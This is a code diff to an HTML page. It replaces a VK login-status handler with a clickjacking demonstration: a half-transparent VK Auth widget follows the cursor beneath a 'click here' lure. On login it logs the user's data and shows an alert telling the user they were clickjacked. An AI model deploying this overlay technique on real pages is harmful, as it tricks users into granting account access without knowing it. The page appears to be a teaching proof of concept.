@@ -34,32 +34,57 @@ window.onload = (function() {
     	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 </head>
 <body>
+	<style>
+		#overlay {
+			width: 100%;
+			height: 100%;
+			position: absolute;
+			top: 0;
+			left: 0;
+			cursor: pointer;
+			z-index: 100;
+		}
+		#wrap1 {
+			overflow: hidden;
+			width: 180px;
+			height: 25px;
+			opacity: 0.5;
+			position: absolute;
+			z-index: 101;
+		
+		}
+		#wrap2 {
+			margin-left: -10px;
+			margin-top: -75px;
+		}
+
+	</style>
 <script type="text/javascript">
     VK.init({
             apiId: 4983778
         });
 </script>
 <script>
-function authInfo(response) {    
-    if(response.status=='connected') {	// если пользователь залогинен в ВК     
-        if(typeof(response.session.user) == 'undefined') { // этого поля нет 
-                //тогда, когда пользователь был залогинен ранее
-                VK.Api.call('users.get', { uid: response.session.mid }, function(r) { 
-                    $('#VKInfo').html(r.response[0].first_name+' '+r.response[0].last_name); 
-                    $('#VKInfo').append('user_id: '+response.session.mid); });
-   }else {
-        // если авторизация прошла только что (от VK.Auth.login(authInfo);), то имя и фамилия уже будут в ответе   
-        $('#VKInfo').html(response.session.user.first_name+' '+response.session.user.last_name);
-        $('#VKInfo').append('user_id: '+response.session.mid);}
-       }else {
-        VK.Auth.login(authInfo); // опционально можем спалиться и вызвать всплывающее окно авторизации
-    }
-}
+	VK.Widgets.Auth("vk_auth", {width: "200px", onAuth: function(data) {
+	console.log(data);
+	alert('Уважемый '+data.first_name+', Вы стали жервой кликджекинга');
+}});
 
-$(function(){VK.Auth.getLoginStatus(authInfo)}); // проверяем наличие входа в ВК, ответ отправляем в функцию обработчик
+var el = $('#wrap1');
+$(window).on('mousemove', function(e) {
+	el.css({left:  e.pageX - 90, top:   e.pageY - 12 });
+});
+
 </script>
+<h1>click here</h1>
+<div id="overlay">
+	<div id="wrap1">
+		<div id="wrap2">
+			<div id="vk_auth"></div>
+		</div>
+	</div>
+</div>
 
-<span id="VKInfo"> </span>
 
 </body>
 </html>
